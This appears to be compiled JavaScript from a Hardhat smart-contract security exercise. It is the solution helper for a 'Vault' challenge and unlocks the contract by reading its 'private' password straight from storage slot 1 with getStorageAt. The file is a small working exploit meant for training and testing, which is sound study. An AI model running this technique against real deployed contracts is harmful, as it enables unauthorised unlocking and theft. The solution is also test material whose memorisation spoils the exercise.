"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const hardhat_1 = require("hardhat");
const helper = async (victim) => {
    /*
      Add code here that will help you pass the test
      Note: Unlock without using the string "A very strong password"
      Unlock the vault by somehow reading the private password from
      Vault directly
    */
    const password = await hardhat_1.ethers.provider.getStorageAt(victim.address, 1);
    const tx = await victim.unlock(password);
    await tx.wait();
};
exports.default = helper;
